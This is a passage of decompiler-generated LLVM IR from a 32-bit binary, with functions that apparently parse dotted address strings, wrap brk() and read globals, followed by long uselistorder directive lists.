dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15db4
  %v7_15dbc = icmp eq i8 %v2_15d94, 46
  br i1 %v7_15dbc, label %dec_label_pc_15dc4, label %dec_label_pc_15e20

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15dbc
  %v1_15dc4 = add i32 %v0_15dd0, 1
  store i32 %v1_15dc4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15de0

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15db4
  %v2_15dcc = icmp eq i8 %v2_15d94, 0
  %v1_15dd0 = add i32 %v0_15dd0, 1
  store i32 %v1_15dd0, i32* %r0.global-to-local, align 4
  br i1 %v2_15dcc, label %dec_label_pc_15de0, label %dec_label_pc_15dd8

dec_label_pc_15dd8:                               ; preds = %dec_label_pc_15dcc
  %v1_15dd8 = and i32 %v6_15da0, 32
  %v2_15dd8 = icmp eq i32 %v1_15dd8, 0
  br i1 %v2_15dd8, label %dec_label_pc_15e20, label %dec_label_pc_15de0

dec_label_pc_15de0:                               ; preds = %dec_label_pc_15dd8, %dec_label_pc_15dcc, %dec_label_pc_15dc4
  %v0_15d6425 = phi i32 [ %v1_15dd0, %dec_label_pc_15dd8 ], [ %v1_15dd0, %dec_label_pc_15dcc ], [ %v1_15dc4, %dec_label_pc_15dc4 ]
  %v4_15de0 = mul i32 %v1_15de0, 256
  %v5_15de0 = or i32 %v0_15de0, %v4_15de0
  %v1_15de4 = add nuw nsw i32 %v0_15de4, 1
  %v7_15dec = icmp slt i32 %v1_15de4, 5
  br i1 %v7_15dec, label %dec_label_pc_15d5c, label %dec_label_pc_15df0

dec_label_pc_15d5c.lr.ph:                         ; preds = %dec_label_pc_15d40
  %v2_15d60.pre = load i32, i32* bitcast (i32** @global_var_1eba0.646 to i32*), align 4
  br label %dec_label_pc_15d5c

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15de0
  %v2_15df0 = icmp eq i32 %v0_15d48, 0
  br i1 %v2_15df0, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_15df0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb40:                                             ; preds = %dec_label_pc_15df0
  %v2_15df8 = and i32 %v5_15de0, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v2_15df4 = udiv i32 %v5_15de0, 256
  %v4_15dfc = and i32 %v2_15df4, 65280
  %v4_15e00 = mul i32 %v2_15df8, 256
  %v5_15e04 = udiv i32 %v5_15de0, 16777216
  %v6_15e04 = or i32 %v4_15dfc, %v5_15e04
  %v5_15e08 = mul i32 %v0_15de0, 16777216
  %v6_15e08 = or i32 %v4_15e00, %v5_15e08
  %v3_15e0c = or i32 %v6_15e04, %v6_15e08
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_15e18 = inttoptr i32 %v0_15d48 to i32*
  store i32 %v3_15e0c, i32* %v3_15e18, align 4
  %v2_15e1c.pre = load i32, i32* %stack_var_-20, align 4
  %v17_15e1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb40
  %v17_15e1c = phi i32 [ 1, %bb ], [ %v17_15e1c.pre, %bb40 ]
  %v2_15e1c = phi i32 [ %v3_15d44, %bb ], [ %v2_15e1c.pre, %bb40 ]
  store i32 %v2_15e1c, i32* @r4, align 4
  ret i32 %v17_15e1c

dec_label_pc_15e20:                               ; preds = %dec_label_pc_15dbc, %dec_label_pc_15dd8, %dec_label_pc_15d5c, %dec_label_pc_15d7c, %dec_label_pc_15d40
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_15d44, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_15d60.pre, { 1, 0 }
  uselistorder i32 %v1_15de4, { 1, 0 }
  uselistorder i32 %v0_15dd0, { 0, 1, 3, 2 }
  uselistorder i32 %v3_15d44, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i32 16777216, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 50, 48, 51, 49, 53, 52, 57, 54, 56, 55, 58, 60, 59, 62, 61, 64, 63, 65, 66, 74, 67, 75, 68, 76, 69, 77, 78, 70, 79, 71, 80, 72, 81, 73, 83, 82, 87, 84, 88, 85, 89, 86, 92, 90, 93, 91, 94, 95, 97, 96, 98, 102, 99, 103, 104, 100, 105, 101, 106, 108, 107, 109, 110, 112, 111, 113, 117, 114, 118, 115, 119, 116, 121, 120, 122, 124, 123, 129, 125, 130, 131, 126, 132, 127, 133, 128, 134, 137, 138, 139, 135, 140, 136, 141, 143, 142, 147, 144, 148, 145, 146, 149, 151, 150, 158, 152, 159, 160, 153, 161, 156, 162, 154, 163, 164, 155, 157, 165, 167, 166, 171, 168, 172, 173, 169, 170, 174, 175, 176, 178, 177, 181, 179, 182, 180, 183, 185, 186, 184, 187 }
  uselistorder i32 65280, { 0, 31, 2, 3, 20, 1, 4, 21, 5, 6, 22, 7, 8, 9, 10, 11, 12, 23, 13, 14, 15, 24, 16, 25, 26, 27, 17, 28, 29, 30, 18, 32, 19 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.24 to i32), { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 16, 0, 17 }
  uselistorder i32 5, { 15, 30, 31, 16, 6, 3, 18, 32, 4, 17, 33, 1, 19, 79, 20, 80, 21, 81, 22, 82, 23, 83, 24, 84, 0, 34, 35, 36, 25, 26, 27, 28, 37, 38, 39, 40, 7, 41, 42, 43, 44, 8, 45, 46, 47, 48, 49, 50, 51, 52, 9, 53, 54, 55, 10, 56, 57, 58, 11, 59, 60, 61, 62, 12, 63, 64, 65, 66, 67, 68, 69, 13, 70, 71, 72, 73, 74, 75, 76, 14, 77, 5, 78, 85, 2, 86, 87, 29, 88 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 67, 68, 69, 65, 66, 70, 73, 74, 75, 71, 72, 76, 77, 78, 79, 80, 473, 474, 81, 82, 83, 84, 85, 86, 87, 88, 89, 91, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 104, 102, 103, 107, 106, 105, 108, 113, 109, 112, 110, 111, 466, 114, 115, 116, 117, 470, 118, 119, 120, 121, 122, 471, 123, 124, 125, 126, 127, 128, 129, 130, 132, 131, 133, 134, 135, 136, 137, 138, 139, 141, 142, 140, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 160, 159, 161, 162, 163, 167, 173, 168, 164, 169, 174, 170, 175, 171, 165, 176, 166, 177, 178, 172, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 191, 192, 190, 193, 196, 197, 195, 194, 198, 201, 200, 199, 208, 205, 202, 203, 209, 206, 210, 207, 211, 204, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 229, 228, 230, 231, 232, 243, 238, 233, 244, 239, 245, 240, 246, 241, 234, 235, 236, 247, 248, 249, 250, 242, 237, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 264, 263, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 277, 276, 286, 282, 278, 287, 283, 279, 288, 284, 289, 285, 280, 281, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 308, 307, 306, 314, 309, 320, 321, 315, 310, 322, 323, 316, 311, 324, 317, 325, 318, 326, 319, 327, 312, 328, 313, 329, 330, 331, 332, 333, 334, 335, 338, 339, 342, 340, 336, 343, 341, 337, 346, 345, 344, 349, 350, 347, 351, 348, 352, 358, 353, 360, 359, 354, 356, 355, 357, 361, 467, 472, 362, 363, 364, 365, 366, 369, 367, 368, 371, 370, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 387, 386, 388, 389, 390, 392, 391, 393, 394, 395, 396, 399, 406, 400, 401, 397, 402, 403, 404, 398, 407, 405, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 421, 420, 422, 423, 424, 428, 435, 429, 430, 436, 431, 425, 426, 432, 427, 433, 437, 434, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 451, 450, 452, 453, 454, 455, 457, 456, 458, 459, 460, 461, 462, 465, 475, 468, 476, 463, 464, 469 }
  uselistorder i32 32, { 74, 56, 57, 54, 69, 70, 66, 67, 68, 4, 3, 6, 5, 8, 7, 55, 53, 75, 76, 59, 58, 10, 9, 12, 11, 14, 13, 16, 15, 65, 18, 17, 19, 20, 21, 23, 22, 24, 26, 25, 28, 27, 29, 30, 32, 31, 60, 71, 72, 33, 73, 34, 35, 36, 0, 37, 1, 2, 38, 39, 40, 41, 42, 44, 43, 61, 77, 62, 78, 63, 79, 46, 45, 48, 47, 49, 50, 51, 52, 64 }
  uselistorder i8 46, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 3, { 36, 67, 68, 180, 69, 70, 71, 72, 73, 74, 87, 97, 181, 4, 160, 175, 176, 0, 75, 21, 76, 22, 177, 82, 37, 23, 25, 88, 40, 89, 2, 90, 91, 92, 93, 38, 5, 161, 162, 163, 164, 41, 165, 42, 166, 43, 167, 44, 168, 45, 169, 46, 170, 24, 171, 47, 172, 39, 173, 48, 94, 49, 95, 96, 26, 100, 50, 51, 52, 53, 54, 1, 98, 99, 55, 101, 102, 103, 104, 105, 106, 56, 107, 57, 108, 27, 109, 110, 111, 112, 113, 7, 6, 58, 28, 114, 115, 116, 117, 118, 119, 120, 9, 8, 59, 121, 29, 122, 123, 124, 125, 126, 127, 128, 129, 11, 10, 60, 130, 30, 131, 132, 133, 134, 135, 13, 12, 61, 136, 31, 137, 138, 139, 140, 62, 141, 15, 14, 33, 142, 32, 143, 144, 145, 146, 147, 148, 17, 16, 63, 149, 34, 150, 151, 152, 153, 154, 155, 156, 19, 18, 64, 157, 35, 158, 20, 159, 3, 174, 178, 77, 83, 78, 84, 79, 85, 80, 86, 65, 179, 66, 81 }
  uselistorder i32 8, { 125, 164, 29, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 30, 181, 72, 73, 74, 75, 79, 76, 77, 78, 182, 150, 149, 147, 148, 126, 127, 128, 151, 152, 153, 141, 142, 143, 6, 33, 34, 31, 32, 17, 18, 26, 27, 35, 183, 80, 81, 82, 83, 7, 8, 63, 21, 9, 10, 16, 11, 51, 36, 52, 37, 53, 38, 12, 13, 14, 64, 54, 68, 28, 129, 130, 131, 132, 134, 55, 135, 136, 133, 69, 70, 56, 71, 15, 57, 84, 39, 85, 86, 87, 88, 89, 90, 91, 92, 93, 3, 94, 95, 96, 4, 97, 98, 99, 100, 101, 102, 103, 5, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 40, 115, 41, 116, 42, 117, 43, 118, 44, 119, 45, 120, 46, 121, 47, 122, 48, 123, 58, 124, 0, 1, 137, 138, 139, 140, 61, 144, 145, 59, 146, 2, 19, 22, 23, 154, 20, 24, 25, 155, 60, 65, 66, 156, 157, 159, 158, 160, 161, 49, 162, 62, 67, 50, 163 }
  uselistorder i32 255, { 1, 12, 13, 0, 4, 15, 5, 16, 2, 17, 3, 18, 8, 19, 9, 20, 6, 21, 7, 22, 11, 14, 10, 23 }
  uselistorder i32 10, { 12, 44, 45, 0, 3, 4, 31, 32, 76, 1, 8, 38, 13, 33, 40, 14, 39, 6, 69, 70, 34, 15, 71, 35, 72, 16, 74, 73, 41, 17, 18, 19, 20, 21, 22, 23, 42, 24, 43, 9, 46, 47, 2, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 25, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 7, 68, 10, 77, 75, 78, 5, 29, 36, 79, 27, 80, 30, 37, 11, 81, 26, 82, 28 }
  uselistorder i8 0, { 8, 0, 1, 31, 32, 2, 13, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 9, 44, 45, 46, 47, 48, 49, 3, 15, 14, 16, 52, 54, 51, 25, 53, 26, 55, 56, 50, 4, 57, 58, 59, 6, 7, 5, 60, 61, 62, 18, 17, 63, 64, 67, 28, 65, 66, 27, 68, 69, 70, 71, 72, 19, 10, 20, 73, 21, 22, 30, 74, 75, 76, 78, 79, 12, 82, 24, 88, 83, 84, 80, 81, 23, 29, 85, 86, 87, 11, 89, 90, 77, 91, 92, 93, 94, 95, 96, 97 }
  uselistorder i32 2, { 4, 146, 278, 279, 59, 280, 281, 49, 282, 48, 283, 47, 152, 76, 77, 263, 78, 264, 79, 265, 5, 147, 284, 54, 80, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 149, 15, 16, 17, 18, 19, 82, 83, 81, 50, 51, 64, 153, 65, 86, 155, 162, 66, 154, 85, 156, 67, 157, 68, 158, 69, 159, 70, 160, 71, 161, 72, 167, 163, 164, 165, 166, 60, 87, 248, 20, 21, 249, 251, 252, 88, 254, 55, 150, 89, 256, 90, 257, 91, 258, 92, 259, 260, 84, 261, 22, 93, 250, 174, 175, 23, 94, 95, 96, 176, 177, 97, 236, 148, 151, 182, 99, 168, 102, 169, 101, 170, 98, 103, 171, 24, 25, 26, 104, 100, 105, 106, 107, 172, 173, 108, 109, 61, 111, 112, 110, 113, 178, 52, 58, 179, 180, 181, 253, 255, 183, 184, 185, 186, 187, 188, 189, 115, 190, 114, 191, 192, 193, 194, 195, 117, 116, 196, 197, 198, 199, 200, 201, 202, 119, 203, 118, 204, 205, 120, 121, 73, 122, 206, 207, 208, 209, 210, 211, 212, 1, 27, 28, 29, 30, 31, 32, 123, 213, 74, 214, 215, 216, 217, 218, 2, 33, 34, 35, 36, 37, 38, 125, 124, 219, 220, 39, 221, 222, 56, 223, 127, 224, 3, 40, 41, 42, 43, 44, 128, 225, 126, 226, 227, 228, 229, 230, 231, 232, 233, 130, 234, 129, 235, 237, 238, 239, 132, 240, 133, 241, 242, 243, 244, 134, 245, 131, 246, 62, 247, 135, 63, 262, 53, 136, 266, 267, 75, 268, 143, 269, 137, 270, 138, 139, 271, 140, 272, 141, 273, 142, 274, 57, 275, 45, 46, 276, 144, 277, 145 }
  uselistorder i32* @r1, { 41, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 1, 108, 109, 14, 15, 17, 16, 5, 6, 110, 0, 111, 48, 49, 12, 113, 50, 55, 56, 59, 57, 58, 51, 52, 53, 54, 43, 60, 112, 10, 4, 42, 18, 61, 62, 3, 63, 64, 65, 44, 7, 8, 9, 47, 38, 21, 11, 13, 19, 20, 45, 46, 2, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder label %dec_label_pc_15e20, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_15d94, { 1, 0 }
}

define i32 @function_15e2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15e2c:
  %v1_15e2c = add i32 %arg1, 28
  %v2_15e2c = inttoptr i32 %v1_15e2c to i32*
  %v3_15e2c = load i32, i32* %v2_15e2c, align 4
  %v1_15e34 = add i32 %arg1, 44
  %v2_15e34 = inttoptr i32 %v1_15e34 to i32*
  %v3_15e34 = load i32, i32* %v2_15e34, align 4
  store i32 %v3_15e2c, i32* @global_var_1eee0.699, align 4
  store i32 %v3_15e34, i32* @global_var_1eee4.701, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 17, 0, 6, 7, 4, 5, 12, 13, 8, 9, 10, 11, 2, 14, 1, 15, 3, 16 }
  uselistorder i32 28, { 28, 0, 13, 14, 4, 5, 22, 1, 6, 7, 8, 9, 10, 11, 12, 2, 3, 24, 23, 15, 16, 17, 18, 19, 20, 21, 25, 26, 27 }
}

define i32 @function_15e50(i32* %arg1) local_unnamed_addr {
dec_label_pc_15e50:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_15e58 = call i32 @brk(i32* %arg1)
  %v3_15e5c = icmp ult i32 %v2_15e58, %tmp
  store i32 %v2_15e58, i32* @global_var_1ec78.696, align 4
  br i1 %v3_15e5c, label %dec_label_pc_15e70, label %dec_label_pc_15e80

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e50
  %v0_15e70 = call i32 @function_13c28()
  %v2_15e78 = inttoptr i32 %v0_15e70 to i32*
  store i32 12, i32* %v2_15e78, align 4
  br label %dec_label_pc_15e80

dec_label_pc_15e80:                               ; preds = %dec_label_pc_15e50, %dec_label_pc_15e70
  %v0_15e80 = phi i32 [ 0, %dec_label_pc_15e50 ], [ -1, %dec_label_pc_15e70 ]
  ret i32 %v0_15e80

; uselistorder directives
  uselistorder i32 12, { 18, 12, 124, 125, 126, 128, 129, 130, 131, 13, 127, 132, 133, 134, 135, 136, 137, 138, 50, 51, 32, 33, 52, 19, 20, 109, 110, 111, 0, 88, 112, 9, 113, 10, 89, 4, 108, 21, 22, 7, 53, 54, 23, 55, 56, 14, 15, 35, 36, 90, 91, 92, 37, 34, 38, 39, 40, 41, 42, 43, 45, 46, 44, 93, 94, 95, 11, 96, 97, 99, 100, 101, 5, 103, 98, 8, 49, 47, 48, 6, 24, 25, 26, 27, 28, 29, 102, 57, 16, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 30, 69, 70, 71, 72, 73, 31, 74, 75, 76, 77, 78, 79, 17, 80, 81, 82, 83, 84, 85, 86, 87, 1, 2, 104, 105, 106, 107, 3, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123 }
  uselistorder i32 ()* @function_13c28, { 28, 37, 27, 55, 12, 11, 10, 9, 54, 53, 52, 8, 62, 26, 25, 59, 58, 23, 24, 45, 44, 22, 21, 36, 20, 35, 19, 57, 18, 34, 17, 46, 43, 51, 50, 49, 42, 56, 16, 5, 4, 41, 15, 48, 47, 40, 3, 7, 39, 30, 6, 29, 14, 38, 2, 1, 33, 32, 61, 60, 31, 0, 13 }
  uselistorder i32* @global_var_1ec78.696, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15e80, { 1, 0 }
}

define i32 @function_15e8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15e8c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15e90 = load i32, i32* @global_var_1ea2c.659, align 4
  %v7_15e94 = icmp eq i32 %v3_15e90, -1
  %v3_15e98 = load i32, i32* @r4, align 4
  store i32 %v3_15e98, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1ea2c.659 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_15e94, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_15e8c
  store i32 %v3_15e98, i32* %r4.global-to-local, align 4
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_15e8c, %.preheader
  %v0_15ea8 = phi i32 [ %v3_15eac, %.preheader ], [ %v3_15e90, %dec_label_pc_15e8c ]
  call void @__pseudo_branch(i32 %v0_15ea8)
  %v0_15eac = load i32, i32* %r4.global-to-local, align 4
  %v1_15eac = add i32 %v0_15eac, -4
  %v2_15eac = inttoptr i32 %v1_15eac to i32*
  %v3_15eac = load i32, i32* %v2_15eac, align 4
  store i32 %v1_15eac, i32* %r4.global-to-local, align 4
  %v3_15eb0 = icmp eq i32 %v3_15eac, -1
  br i1 %v3_15eb0, label %dec_label_pc_15eb8, label %.preheader

dec_label_pc_15eb8:                               ; preds = %.preheader
  %v2_15eb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15eb8, i32* %r4.global-to-local, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v3_15eac, { 1, 0 }
  uselistorder i32 %v3_15e90, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 54, 16, 55, 56, 57, 3, 17, 18, 19, 58, 59, 60, 4, 20, 21, 22, 61, 62, 63, 5, 23, 24, 64, 15, 14, 65, 66, 67, 13, 12, 11, 10, 25, 26, 27, 28, 29, 0, 30, 1, 31, 2, 68, 9, 32, 42, 43, 49, 44, 33, 34, 45, 46, 47, 48, 50, 8, 7, 41, 6, 35, 36, 37, 51, 38, 39, 52, 53, 40 }
  uselistorder i32 -1, { 176, 0, 102, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 177, 103, 321, 104, 331, 105, 332, 311, 106, 370, 107, 371, 108, 372, 109, 373, 156, 98, 312, 313, 110, 314, 315, 111, 374, 1, 178, 2, 112, 333, 334, 179, 180, 307, 308, 157, 181, 158, 182, 3, 4, 97, 83, 84, 183, 184, 185, 95, 295, 186, 296, 5, 6, 113, 335, 114, 336, 115, 322, 116, 337, 117, 323, 118, 338, 119, 309, 120, 339, 121, 324, 122, 340, 123, 320, 124, 297, 125, 175, 126, 187, 127, 298, 128, 310, 129, 341, 130, 377, 378, 131, 299, 132, 342, 133, 316, 134, 317, 135, 300, 136, 379, 137, 375, 138, 301, 139, 329, 140, 376, 141, 330, 142, 343, 143, 302, 144, 380, 99, 381, 188, 189, 190, 191, 192, 193, 194, 195, 7, 8, 9, 10, 11, 145, 146, 12, 196, 197, 17, 198, 325, 16, 199, 101, 100, 326, 13, 200, 289, 148, 290, 292, 293, 201, 202, 203, 147, 291, 18, 204, 91, 19, 205, 206, 20, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 294, 14, 227, 15, 228, 229, 21, 230, 231, 149, 327, 232, 22, 233, 328, 92, 23, 24, 234, 96, 25, 26, 27, 28, 29, 150, 235, 318, 236, 319, 161, 303, 30, 159, 304, 31, 32, 160, 305, 33, 34, 162, 306, 35, 36, 37, 38, 39, 237, 85, 86, 87, 88, 89, 90, 40, 41, 42, 238, 239, 240, 241, 43, 152, 153, 154, 155, 44, 45, 46, 242, 47, 48, 49, 50, 51, 93, 52, 53, 54, 55, 56, 57, 58, 243, 59, 151, 60, 61, 62, 244, 63, 64, 65, 66, 245, 67, 68, 69, 246, 70, 71, 72, 73, 74, 75, 76, 247, 77, 78, 79, 248, 80, 81, 249, 250, 251, 252, 82, 94, 344, 345, 168, 346, 166, 347, 167, 348, 164, 349, 253, 254, 255, 256, 257, 169, 350, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 163, 351, 170, 352, 284, 285, 286, 287, 288, 165, 353, 171, 354, 172, 173, 174 }
  uselistorder i32* @global_var_1ea2c.659, { 1, 0 }
  uselistorder i32 1, {}
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_15ec0() local_unnamed_addr {
dec_label_pc_15ec0:
  %v5_15ec4 = load i32, i32* @r0, align 4
  ret i32 %v5_15ec4

; uselistorder directives
  uselistorder i32* @r0, { 4, 93, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 56, 57, 59, 58, 24, 199, 200, 30, 31, 32, 33, 13, 3, 18, 19, 115, 116, 25, 201, 202, 46, 204, 8, 11, 118, 17, 117, 95, 29, 96, 20, 108, 119, 203, 38, 21, 60, 61, 62, 63, 27, 16, 64, 65, 66, 67, 15, 205, 7, 10, 120, 14, 121, 6, 122, 123, 12, 124, 125, 126, 127, 0, 34, 97, 98, 35, 36, 37, 99, 101, 102, 103, 104, 107, 100, 44, 45, 81, 39, 40, 41, 42, 43, 5, 47, 48, 49, 50, 51, 52, 26, 53, 54, 55, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 28, 80, 105, 106, 1, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 109, 110, 111, 112, 113, 128, 114, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 9, 2, 22, 23 }
}

define i32 @function_15ec8() local_unnamed_addr {
entry:
  %v3_15ecc = load i32, i32* @r4, align 4
  %v0_15ed4 = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_15ecc)
  ret i32 %v0_15ed4

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 8, 13, 14, 10, 11, 12, 15, 5, 6, 7, 2, 3, 4, 1, 9 }
  uselistorder i32 0, { 145, 0, 963, 964, 965, 966, 147, 146, 967, 1437, 1438, 1439, 1440, 1441, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1442, 1443, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 38, 1462, 1463, 1464, 1465, 1466, 39, 1467, 1468, 1469, 40, 1470, 1471, 1472, 41, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1488, 1489, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 42, 1508, 1509, 1510, 1511, 1512, 43, 1513, 1514, 1515, 1516, 1517, 44, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 781, 782, 323, 783, 324, 971, 1067, 1068, 1069, 1070, 1071, 784, 785, 1531, 1532, 1533, 1534, 325, 786, 1, 787, 788, 789, 1535, 1536, 1537, 148, 1538, 98, 1539, 96, 97, 1540, 1541, 1542, 326, 1546, 327, 1559, 1561, 629, 259, 1562, 328, 1560, 329, 330, 2, 1543, 1544, 149, 1072, 280, 1073, 333, 282, 281, 1074, 1075, 1076, 1077, 332, 1079, 1080, 331, 1081, 1545, 759, 760, 761, 762, 763, 764, 151, 115, 765, 99, 150, 152, 335, 1547, 336, 283, 1548, 1551, 1553, 1554, 334, 1084, 1086, 1087, 74, 260, 1088, 1085, 1082, 1083, 3, 972, 975, 973, 974, 261, 4, 1091, 1089, 1090, 262, 153, 976, 977, 978, 979, 1043, 1044, 337, 5, 1045, 6, 1098, 1099, 154, 1092, 1093, 1094, 1095, 1096, 1097, 7, 8, 1078, 714, 715, 716, 338, 9, 339, 1100, 1101, 623, 980, 624, 1102, 981, 1103, 766, 1104, 982, 1105, 877, 717, 968, 1563, 1564, 88, 790, 340, 791, 792, 793, 794, 341, 795, 796, 797, 798, 799, 800, 801, 718, 767, 1106, 1552, 719, 1107, 802, 820, 720, 625, 1555, 102, 1556, 1549, 721, 1059, 1550, 1060, 1108, 722, 1557, 1558, 10, 1109, 116, 1110, 1111, 256, 255, 630, 103, 104, 105, 106, 656, 631, 76, 75, 117, 1112, 1113, 1114, 1115, 1117, 1116, 11, 1118, 1119, 258, 257, 632, 107, 108, 109, 110, 657, 633, 78, 77, 73, 85, 1120, 658, 1121, 1122, 1123, 111, 1124, 1125, 1126, 1127, 1128, 155, 634, 659, 635, 636, 1129, 660, 125, 156, 1130, 1131, 112, 1132, 1133, 12, 661, 263, 14, 13, 157, 1134, 158, 662, 15, 264, 159, 160, 314, 79, 161, 342, 983, 100, 803, 804, 1136, 1135, 1137, 1138, 45, 162, 1139, 165, 164, 163, 315, 316, 317, 167, 166, 168, 343, 1140, 1141, 169, 1046, 1047, 126, 170, 1142, 171, 686, 172, 1143, 1144, 173, 1145, 1146, 689, 637, 984, 118, 985, 986, 690, 691, 687, 663, 350, 688, 710, 711, 692, 693, 174, 175, 694, 695, 696, 697, 664, 348, 698, 699, 665, 349, 700, 701, 666, 347, 702, 703, 667, 346, 704, 705, 668, 345, 706, 713, 669, 344, 707, 712, 708, 93, 80, 127, 128, 709, 628, 987, 351, 988, 266, 989, 352, 990, 993, 994, 177, 265, 991, 992, 353, 354, 995, 996, 284, 997, 998, 670, 89, 355, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 277, 276, 1007, 356, 1008, 113, 1009, 1010, 129, 1011, 655, 1012, 1013, 1014, 654, 1015, 1016, 1017, 176, 357, 358, 1018, 1021, 1022, 1023, 1024, 1025, 178, 1019, 179, 1020, 16, 180, 999, 739, 740, 741, 95, 81, 742, 94, 82, 743, 744, 745, 746, 747, 748, 359, 749, 750, 752, 181, 751, 90, 753, 18, 17, 754, 821, 822, 825, 826, 823, 824, 827, 828, 723, 361, 725, 182, 726, 727, 728, 729, 730, 731, 732, 733, 184, 183, 734, 91, 362, 735, 724, 365, 366, 19, 736, 737, 185, 738, 71, 72, 367, 368, 363, 360, 364, 755, 756, 757, 758, 369, 318, 189, 188, 671, 319, 191, 190, 672, 320, 193, 192, 673, 321, 195, 194, 674, 675, 322, 187, 186, 268, 275, 269, 270, 271, 370, 768, 196, 197, 777, 769, 770, 771, 772, 773, 774, 775, 776, 267, 778, 779, 83, 780, 198, 199, 371, 101, 805, 806, 